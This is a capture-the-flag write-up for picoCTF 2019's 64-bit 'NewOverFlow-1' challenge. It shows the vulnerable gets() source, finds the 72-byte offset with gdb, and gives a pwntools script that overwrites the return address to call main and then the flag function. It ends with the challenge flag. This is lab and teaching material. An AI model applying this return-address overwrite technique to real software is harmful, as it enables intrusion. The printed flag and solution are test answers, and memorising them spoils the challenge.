# NewOverFlow-1 - Points: 200
<b>Description : </b>Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program. You can find it in /problems/newoverflow-1_5_bd04c7682164df72135e036dd527b668 on the shell server. Source.<br>
<b>Hints : </b>Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes
# Solved
Lets check the source
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```
So take a note, this is a 64-bit program. So address of application its 8 byte. So i try to get <b>flag</b> addr
```
objdump -D ./vuln | grep "flag"
0000000000400767 <flag>
```
```python
'\x67\x07\x40\x00\x00\x00\x00\x00'
```
We look again at <b>BUFFSIZE</b> is <b>64 Length</b>, so i need <b>8 Bytes</b> to overflow and this is what happens when i overflow it.
```python
print 'A' * 72 | ./vuln
```
Its stuck and nothing happening. So i increase it into 80 bytes and finally got this
```python
print 'A' * 80 | ./vuln
```
```
Program received signal SIGSEGV, Segmentation fault.
0x00000000004007e7 in vuln ()
(gdb) bt
#0  0x00000000004007e7 in vuln ()
#1  0x4141414141414141 in ?? ()
#2  0x00007ffee3527800 in ?? ()
#3  0x0000000100400680 in ?? ()
#4  0x00007ffee35278e0 in ?? ()
#5  0x0000c30e00000000 in ?? ()
#6  0x0000000000400860 in ?? ()
```
Okay we got the address to place address flag! lets try to place the address flag
```python
python -c 'print "A" * 72 + "\x67\x07\x40\x00\x00\x00\x00\x00"' | ./vuln

Welcome to 64-bit. Give me a string that gets you the flag:
Segmentation fault (core dumped)
```
Still got Segmentation fault! :(. So i try to read some write-ups by https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/NewOverFlow-1.md. He found there is problem in function <b>printf, while attempting to print the flag.</b> <i>This value is 16-byte aligned, so the program crashes. Looks like a compiler optimization is standing between us and the flag.

The solution was to call main again via the original payload, and then call flag as intended. Lucky for us, the stack was correctly aligned for such a call stack.</i><br>
So this is my python script to solving this
```python
from pwn import *

p = process("./vuln")

# First Payload into function main execute
# 00 00 00 00 00 40 07 e8 <main>
payload = "A" * 72 + "\xe8\x07\x40\x00\x00\x00\x00\x00"
p.sendlineafter("Welcome", payload)
log.info("Payload into function <main> Done")

# Last Payload into function flag to execute
# 00 00 00 00 00 40 07 67 <flag>
payload = "A" * 72 + "\x67\x07\x40\x00\x00\x00\x00\x00"
p.sendlineafter("Welcome", payload)
log.info("Payload into function <flag> Done")

print p.recvall()
```
```
[+] Starting local process './vuln': pid 254066
[*] Payload into function <main> Done
[*] Payload into function <flag> Done
[+] Receiving all data: Done (104B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 254066)
 to 64-bit. Give me a string that gets you the flag:
picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_351346a2}
```
Flag : <b>picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_351346a2}</b>